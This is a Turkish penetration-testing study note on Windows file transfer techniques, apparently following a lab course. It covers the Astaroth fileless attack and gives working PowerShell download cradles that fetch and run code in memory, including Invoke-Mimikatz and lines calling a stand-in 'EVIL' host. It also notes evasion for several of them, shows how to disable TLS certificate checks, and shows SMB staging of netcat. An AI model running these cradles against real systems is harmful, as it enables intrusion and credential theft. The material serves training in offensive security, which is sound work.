---
{"dg-publish":true,"permalink":"/active-directory/file-transfers/"}
---


Dosyaların bir hedef sisteme veya sistemden aktarılmasının gerekli olduğu birçok durum vardır. Aşağıdaki senaryoyu hayal edelim:

Bir görev sırasında, sınırsız file upload güvenlik açığı aracılığıyla bir IIS web sunucusunda remote code execution (RCE) elde ediyoruz. Başlangıçta bir web shell yüklüyoruz ve ardından ayrıcalıkları yükseltmek amacıyla sistemi daha fazla numaralandırmak için kendimize bir reverse shell gönderiyoruz. [[Bağlantılar/PowerUp.ps1\|PowerUp.ps1]]'i (ayrıcalık yükseltme vektörlerini numaralandırmak için bir PowerShell script'i) aktarmak için PowerShell'i kullanmaya çalışıyoruz, ancak PowerShell [[Bağlantılar/Application Control Policy\|Application Control Policy]] tarafından engelleniyor. Lokal numaralandırmamızı manuel olarak gerçekleştiriyoruz ve [[Bağlantılar/SeImpersonatePrivilege\|SeImpersonatePrivilege]]'a sahip olduğumuzu görüyoruz. [[Bağlantılar/PrintSpoofer\|PrintSpoofer]] aracını kullanarak ayrıcalıkları yükseltmek için hedef makinemize bir binary aktarmamız gerekiyor. Daha sonra kendi derlediğimiz dosyayı doğrudan kendi GitHub'ımızdan indirmek için [[Bağlantılar/Certutil\|Certutil]]'i kullanmaya çalışıyoruz, ancak kuruluşun güçlü web içeriği filtrelemesi var. Dosya aktarmak için kullanılabilecek GitHub, Dropbox, Google Drive gibi web sitelerine erişemiyoruz. Ardından, bir FTP Sunucusu kurduk ve dosyaları aktarmak için Windows FTP client'ini kullanmayı denedik, ancak ağ güvenlik duvarı 21 numaralı port (TCP) için giden trafiği engelledi. Bir klasör oluşturmak için[[ Impacket smbserver\| Impacket smbserver]] aracını kullanmayı denedik ve TCP portu 445'e (SMB) giden trafiğe izin verildiğini gördük. Binary dosyayı hedef makinemize başarıyla kopyalamak ve ayrıcalıkları yönetici düzeyinde bir kullanıcıya yükseltme hedefimizi gerçekleştirmek için bu file transfer yöntemini kullandık.


# Windows File Transfer Methods
Gelişmiş bir kalıcı tehdide (APT) örnek olarak Microsoft Astaroth Attack [blog](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) gönderisini kullanalım.

Blog yazısı[ fileless tehditler](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/) hakkında konuşarak başlıyor. [[Bağlantılar/Fileless\|Fileless]] terimi, bir tehdidin bir dosya içinde gelmediğini, bir saldırıyı yürütmek için bir sistemde built-in olarak bulunan local araçları kullandıklarını göstermektedir. Bu, bir dosya aktarım işlemi olmadığı anlamına gelmez. Bu bölümün ilerleyen kısımlarında tartışıldığı gibi, dosya sistemde “mevcut” değildir ancak bellekte çalışır.

Astaroth saldırısı genel olarak şu adımları izlemiştir: Spear-phishing e-postasındaki zararlı bir bağlantı bir LNK dosyasına yönlendiriyordu. Çift tıklandığında, LNK dosyası [WMIC aracının ](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic)“/Format” parametresiyle yürütülmesine neden oluyor, bu da zararlı JavaScript kodunun indirilmesine ve yürütülmesine izin veriyordu. JavaScript kodu da [Bitsadmin](https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool) aracını kötüye kullanarak ödeme dosyalarını indirmektedir. 

[[Bağlantılar/WMIC\|WMIC]] ve [[Bağlantılar/Bitsadmin\|Bitsadmin]] Nedir ? 

Tüm payloadlar base64 ile kodlanmış ve Certutil aracı kullanılarak çözülmüş ve birkaç DLL dosyası elde edilmiştir. Daha sonra [regsvr32](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) aracı, şifresi çözülen DLL'lerden birini yüklemek için kullanıldı ve bu da son payload olan Astaroth, Userinit prosesine enjekte edilene kadar diğer dosyaların şifresini çözdü ve yükledi. Aşağıda saldırının grafiksel bir tasviri yer almaktadır.

[[Bağlantılar/regsvr32\|regsvr32]] nedir ? 

![Pasted image 20241017164754.png](/img/user/resimler/Pasted%20image%2020241017164754.png)
1. Saldırı, bir kimlik avı e-postasındaki bağlantıya tıklanarak indirilen .lnk dosyası ile başlar. Tıklandığında, bu .lnk dosyası BAT komut dosyasını çalıştırır ve WMIC kullanılır.
    
2. WMIC, gizlenmiş bir JavaScript içeren bir XSL dosyasını indirir ve bu dosya WMIC'yi tekrar çalıştırır.
    
3. WMIC, tekrar bir XSL dosyası indirir. Bu dosya, Bitsadmin, Certutil ve Regsvr gibi araçları kullanan obfuscate edilmiş (gizlenmiş) bir JavaScript içerir.
    
4. Birden fazla Bitsadmin örneği kullanılarak şifrelenmiş payloadları indirilir.
    
5. Certutil, indirilen payloadları çözer.
    
6. Çözülen payloadlardan biri Regsvr32 aracı ile çalıştırılır ve ikinci bir DLL çalıştırılır. Bu DLL, üçüncü bir DLL’i reflected olarak yükler. Bu üçüncü DLL, Userinit'e başka bir DLL enjekte eder.
    
7. Userinit'e yüklenen DLL, bir proxy işlevi görür; şifreleri çözer, reflected olarak son bir DLL yükler. Bu son DLL, bilgi çalma amaçlı Astaroth zararlısıdır.

Bu, dosya aktarımı için birden fazla yöntemin ve tehdit aktörünün savunmaları atlatmak için bu yöntemleri kullanmasının mükemmel bir örneğidir.


### İndirme İşlemleri
MS02 makinesine erişimimiz var ve Pwnbox makinemizden bir dosya indirmemiz gerekiyor. Birden fazla File Download yöntemi kullanarak bunu nasıl başarabileceğimizi görelim.
![Pasted image 20241017165017.png](/img/user/resimler/Pasted%20image%2020241017165017.png)

## PowerShell Base64 Encode & Decode
Bir terminale erişimimiz varsa, bir dosyayı base64 dizesine kodlayabilir, içeriğini terminalden kopyalayabilir ve ters işlemi gerçekleştirerek dosyayı orijinal içeriğinde çözebiliriz. Bunu PowerShell ile nasıl yapabileceğimizi görelim.

Bu yöntemi kullanmanın önemli bir adımı, kodladığınız ve kodunu çözdüğünüz dosyanın doğru olduğundan emin olmaktır. 128-bit MD5 checksum'larını hesaplayan ve doğrulayan bir program olan md5sum'u kullanabiliriz. Örnek bir ssh anahtarını aktarmayı deneyelim. 

### Pwnbox SSH Anahtar MD5 Hash'ini Kontrol Et
```shell-session
M1R4CKCK@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```


### Pwnbox SSH Anahtarını Base64'e Kodlama
```shell-session
M1R4CKCK@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

----


- **`base64`**: Veriyi Base64 formatında kodlayan veya çözümleyen bir komut.
- **`-w 0`**: Base64 çıktısında satır uzunluğunu belirtir.
    - `-w 0`: Çıkışın tek bir satırda olması gerektiğini söyler (yani satır uzunluğu sınırı yoktur).
    - Varsayılan olarak, Base64 çıktısı her 76 karakterde bir satır sonu ekler. `-w 0` ile bu kaldırılır.

Bu bölümün işlevi: `id_rsa` dosyasının içeriğini Base64 formatında kodlamak ve tüm çıktıyı tek bir satırda vermektir.

**`;`**: Birden fazla komutu arka arkaya çalıştırmak için kullanılır.

- Burada, `base64 -w 0` işlemi bittikten sonra bir sonraki komut çalıştırılır: `echo`.

**`echo`**: Standart çıktıya bir satır sonu veya belirli bir mesaj yazdırır.

- Burada, `echo` yalnızca bir satır sonu eklemek için kullanılmış.

----


Bu içeriği kopyalayıp bir Windows PowerShell terminaline yapıştırabilir ve kodunu çözmek için bazı PowerShell fonksiyonlarını kullanabiliriz.

```powershell-session
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

Son olarak, md5sum ile aynı şeyi yapan [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet'ini kullanarak dosyanın başarıyla aktarılıp aktarılmadığını doğrulayabiliriz.



### MD5 Hash'lerinin Eşleştiğini Doğrulama
```powershell-session
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

Not: Bu yöntem kullanışlı olsa da, her zaman kullanılması mümkün değildir. Windows Komut Satırı yardımcı programının (cmd.exe) maksimum string uzunluğu 8.191 karakterdir. Ayrıca, çok büyük stringler göndermeye çalışırsanız bir web shell hata verebilir.

## PowerShell Web Downloads
Çoğu şirket, çalışan verimliliğini sağlamak için güvenlik duvarı üzerinden HTTP ve HTTPS giden trafiğine izin verir. Dosya aktarım işlemleri için bu ulaşım yöntemlerinden yararlanmak çok uygundur. Yine de savunucular, belirli web sitesi kategorilerine erişimi engellemek, dosya türlerinin (.exe gibi) indirilmesini engellemek veya daha kısıtlı ağlarda yalnızca beyaz listedeki domainlerin bir listesine erişime izin vermek için Web filtreleme çözümlerini kullanabilir.

PowerShell birçok dosya aktarım seçeneği sunar. PowerShell'in herhangi bir sürümünde, [[Bağlantılar/System.Net.WebClient\|System.Net.WebClient]] class'ı HTTP, HTTPS veya FTP üzerinden bir dosya indirmek için kullanılabilir. Aşağıdaki [tabloda](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0), bir kaynaktan veri indirmeye yönelik WebClient yöntemleri açıklanmaktadır:

* [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0) : Bir kaynaktan gelen verileri [Stream](https://learn.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0) olarak döndürür.
* [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0) : Çağıran thread'i bloklamadan bir kaynaktan veri döndürür.
* [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0) : Bir kaynaktan veri indirir ve bir Byte dizisi döndürür.
* [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0) : Bir kaynaktan veri indirir ve çağıran thread'i bloklamadan bir Byte dizisi döndürür.
* [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0) : Bir kaynaktan lokal bir dosyaya veri indirir.
* [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0) : Çağıran thread'i engellemeden bir kaynaktan yerel bir dosyaya veri indirir.
* [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0) Bir kaynaktan bir String indirir ve bir String döndürür.
* [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) : Çağıran thread'i engellemeden bir kaynaktan bir String indirir.


### 1. OpenRead

- **Açıklama**: Bu yöntem, belirtilen URL'den veri akışını açar ve döndürür.
- **Kullanım**: Bir dosyayı veya kaynağı doğrudan akış ([[Bağlantılar/stream\|stream]]) olarak almak istediğinizde kullanılır. Örneğin, bir görselin içeriğini doğrudan okuyabilirsiniz.

### 2. OpenReadAsync

- **Açıklama**: OpenRead yönteminin asenkron (engellemeyen) versiyonudur.
- **Kullanım**: Bir kaynaktan veri akışı almak istediğinizde, uygulamanızın diğer bölümlerinin çalışmaya devam etmesine olanak tanır. Yani, veri indirilirken kullanıcı arayüzü donmaz.

### 3. DownloadData

- **Açıklama**: Bu yöntem, belirtilen URL'den veriyi indirir ve bunu bir **byte dizisi** olarak döndürür.
- **Kullanım**: Web sayfasının veya dosyanın içeriğini ikili formatta almak istediğinizde kullanılır. Örneğin, bir resim veya diğer ikili dosyalar için uygundur.

### 4. DownloadDataAsync

- **Açıklama**: DownloadData yönteminin asenkron versiyonudur.
- **Kullanım**: Veriyi indirirken uygulamanızın diğer işlemlerinin devam etmesini istiyorsanız bu yöntemi kullanabilirsiniz.

### 5. DownloadFile

- **Açıklama**: Belirtilen URL'den veriyi indirir ve bunu yerel bir dosyaya kaydeder.
- **Kullanım**: Dosyayı doğrudan bilgisayarınıza indirmek istediğinizde kullanılır. Örneğin, bir PDF veya görüntü dosyasını belirli bir dizine kaydetmek için idealdir.

### 6. DownloadFileAsync

- **Açıklama**: DownloadFile yönteminin asenkron versiyonudur.
- **Kullanım**: Bir dosya indirirken uygulamanızın donmamasını sağlamak için kullanılır. Dosya indirildiği sırada kullanıcı arayüzü kullanılabilir durumda kalır.

### 7. DownloadString

- **Açıklama**: Bu yöntem, belirtilen URL'den bir metin dizesi (string) indirir ve bunu bir string olarak döndürür.
- **Kullanım**: Web sayfalarının içeriğini metin olarak almak istediğinizde kullanılır. Örneğin, bir JSON veya HTML içeriğini almak için idealdir.

### 8. DownloadStringAsync

- **Açıklama**: DownloadString yönteminin asenkron versiyonudur.
- **Kullanım**: Bir metin dizesini indirirken uygulamanızın diğer bölümlerinin çalışmaya devam etmesini sağlamak için kullanılır.

[[Bahsedilen 8 yöntemin detaylı açıklaması \|Bahsedilen 8 yöntemin detaylı açıklaması ]]

### PowerShell DownloadFile Yöntemi
==Net.WebClient== class adını ve ==DownloadFile== metodunu, indirilecek hedef dosyanın URL'sine ve çıktı dosya adına karşılık gelen parametrelerle belirtebiliriz.

#### File Download

```powershell-session
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```


#### PowerShell DownloadString - Fileless Method
Daha önce tartıştığımız gibi, fileless saldırılar, payload'u indirmek ve doğrudan çalıştırmak için bazı işletim sistemi fonksiyonlarını kullanarak çalışır. PowerShell de fileless saldırılar gerçekleştirmek için kullanılabilir. Bir PowerShell script'ini diske indirmek yerine, [Invoke-Expression](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet'ini veya ==[[Bağlantılar/IEX\|IEX]]== takma adını kullanarak doğrudan bellekte çalıştırabiliriz.  

```powershell-session
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX ayrıca pipeline girdisini de kabul eder.

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```


### PowerShell Invoke-WebRequest
PowerShell 3.0'dan itibaren [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet'i de kullanılabilir, ancak dosya indirmede fark edilir derecede yavaştır. Invoke-WebRequest tam adı yerine iwr, curl ve wget takma adlarını kullanabilirsiniz.

```powershell-session
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
Harmj0y burada PowerShell indirme cradle'larının kapsamlı bir [listesini](https://gist.github.com/HarmJ0y/bb48307ffa663256e239) derlemiştir. Duruma uygun olanı seçmek için bunlara ve proxy farkındalığının olmaması veya diske dokunma (hedefe bir dosya indirme) gibi ayrıntılarına aşinalık kazanmaya değer.

### 1- Normal Download Cradle

```powershell-session
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
```
- **Açıklama**: Burada `Net.WebClient` sınıfı ile belirtilen URL'deki (`http://EVIL/evil.ps1`) PowerShell komut dosyası (script) içerik olarak indirilir. `downloadstring()` komutuyla metin olarak alınan bu içerik, `Invoke-Expression` (`IEX`) ile bellekte çalıştırılır.
- **Avantajı**: Hızlı ve doğrudan indirme.
- **Dezavantajı**: Client tarafında filtreleme varsa tespit edilebilir.

### 2- PowerShell 3.0+ İçin Basit Yöntem

```powershell-session
IEX (iwr 'http://EVIL/evil.ps1')
```

- **Açıklama**: `iwr` (Invoke-WebRequest) cmdlet'i PowerShell 3.0 ve üstünde desteklenir. Bu komut, URL’deki veriyi indirir ve `Invoke-Expression` ile çalıştırır.
- **Avantajı**: Modern PowerShell sürümleri için kısa ve işlevsel bir yöntem.
- **Dezavantajı**: Proxy filtreleri veya güvenlik duvarları engelleyebilir.
### 3- Internet Explorer (IE) COM Nesnesi ile Gizli İndirme

```powershell-session
$h = New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://EVIL/evil.ps1',$false);
$h.send();
iex $h.responseText
```
- **Açıklama**: `InternetExplorer.Application` nesnesi kullanılarak Internet Explorer gizli modda açılır, URL'e yönlendirilir ve içerik HTML formatında (`innerHTML`) alınarak çalıştırılır.
- **Avantajı**: İndirilen içeriğin IE kullanılarak yüklenmesi bazı güvenlik araçlarından kaçabilir.
- **Dezavantajı**: Internet Explorer yüklü değilse çalışmaz.

### 4- WinHttp COM Nesnesi ile İndirme

```powershell-session
$h = new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://EVIL/evil.ps1',$false);
$h.send();
iex $h.responseText
```
- **Açıklama**: `WinHttpRequest` COM nesnesi ile HTTP GET isteği yapılarak veriler indirilir. İndirilen içerik `responseText` ile çalıştırılır.
- **Avantajı**: Genellikle güvenlik katmanlarından geçebilir.
- **Dezavantajı**: Proxy desteklememesi, tespit edilme riskini artırır.

### 5- Bits Transfer ile İndirme (Disk Kullanır)

```powershell-session
Import-Module bitstransfer;
Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;
$r = gc $env:temp\t;
rm $env:temp\t;
iex $r
```
- **Açıklama**: BITS (Background Intelligent Transfer Service) kullanılarak, dosya önce geçici klasöre indirilir (`$env:temp\t`). Ardından, dosya bellekte çalıştırılır (`gc` - Get-Content) ve dosya silinir.
- **Avantajı**: BITS, işletim sistemi tarafından yönetildiği için daha az dikkat çeker.
- **Dezavantajı**: Geçici dosya yaratıldığı için iz bırakır.
### 6 - DNS TXT Kayıtları ile İndirme

```powershell-session
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select-String -Pattern '"*"') -split '"')[0])))
```
- **Açıklama**: Zararlı kod, bir DNS sunucusunda TXT kaydı olarak Base64 kodlanmış şekilde saklanır. PowerShell ile `nslookup` çalıştırılarak TXT kaydı alınır, kod çözülür ve çalıştırılır.
- **Avantajı**: Ağ trafiğini minimize eder, filtrelerden geçebilir.
- **Dezavantajı**: DNS kayıtları yoğun şekilde denetlenirse tespit edilebilir.

### 7- XML ile Komut Almak

```powershell-session
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
$a.command.a.execute | iex
```
- **Açıklama**: Bu teknik, XML dosyasından bir komut alır ve bu komutu bellekte çalıştırır. Komut, internet üzerinden bir URL'den indirilen XML dosyasının belirli bir alanında bulunur ve `iex` ile çalıştırılır.
- **Avantajı**: XML ile çalışmak saldırıyı gizlemeye yardımcı olabilir.
- **Dezavantajı**: XML içeriği denetimden geçebilir veya URL engellenebilir.

### PowerShell ile Sık Karşılaşılan Hatalar
Internet Explorer ilk başlatma yapılandırmasının tamamlanmadığı ve bu durumun indirmeyi engellediği durumlar olabilir.
![Pasted image 20241017213644.png](/img/user/resimler/Pasted%20image%2020241017213644.png)
Bu, -==UseBasicParsing== parametresi kullanılarak atlanabilir.

```powershell-session
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

PowerShell indirmelerindeki bir diğer hata, sertifika güvenilir değilse SSL/TLS güvenli kanalıyla ilgilidir. Aşağıdaki komut ile bu hatayı atlatabiliriz:

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


## SMB Downloads
Uygulamaların ve kullanıcıların remote sunuculara ve remote sunuculardan dosya transfer etmesini sağlar.

Pwnbox'ımızdan kolayca dosya indirmek için SMB kullanabiliriz. Impacket'ten [[Bağlantılar/smbserver.py\|smbserver.py]] ile Pwnbox'ımızda bir SMB sunucusu oluşturmamız ve ardından copy, move, PowerShell Copy-Item veya SMB'ye bağlanmaya izin veren herhangi bir aracı kullanmamız gerekir.


#### Create the SMB Server
```shell-session
M1R4CKCK@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
SMB sunucusundan geçerli çalışma dizinine bir dosya indirmek için aşağıdaki komutu kullanabiliriz:


### SMB Sunucusundan Dosya Kopyalama
```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```
Windows'un yeni sürümleri, aşağıdaki komutta görebileceğimiz gibi kimliği doğrulanmamış konuk erişimini engeller:

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
Bu senaryoda dosyaları aktarmak için Impacket SMB sunucumuzu kullanarak bir kullanıcı adı ve şifre belirleyebilir ve SMB sunucusunu windows hedef makinemize bağlayabiliriz:


### SMB Sunucusunu Kullanıcı Adı ve Parola ile Oluşturma
```shell-session
M1R4CKCK@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```


### SMB Sunucusunu Kullanıcı Adı ve Parola ile Bağlama
```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

Not: `copy filename \\IP\sharename` seçeneğini kullandığınızda bir hata alırsanız SMB sunucusunu da bağlayabilirsiniz.


## FTP Downloads
Dosyaları aktarmanın bir başka yolu da TCP/21 ve TCP/20 bağlantı noktasını kullanan FTP'yi (Dosya Aktarım Protokolü) kullanmaktır. Bir FTP sunucusundan dosya indirmek için FTP istemcisini veya PowerShell Net.WebClient'ı kullanabiliriz.

Python3 pyftpdlib modülünü kullanarak saldırı hostumuzda bir FTP Sunucusu yapılandırabiliriz. Aşağıdaki komut ile kurulabilir:

#### Installing the FTP Server Python3 Module - pyftpdlib

```shell-session
$ sudo pip3 install pyftpdlib
```

